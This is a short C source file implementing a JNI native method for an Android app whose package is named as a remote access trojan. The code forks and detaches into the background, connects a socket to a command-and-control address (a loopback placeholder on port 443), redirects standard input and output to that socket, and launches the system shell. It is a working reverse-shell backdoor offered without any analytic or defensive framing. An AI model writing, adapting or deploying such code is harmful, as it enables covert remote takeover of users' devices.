#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

JNIEXPORT void JNICALL Java_com_example_rat_MainActivity_nativeStart(JNIEnv *env, jobject thiz) {
    // Fork to background
    if (fork() != 0) return;
    setsid();
    // Reverse shell to C2
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    inet_pton(AF_INET, "127.0.0.1", &addr.sin_addr);
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execl("/system/bin/sh", "sh", NULL);
}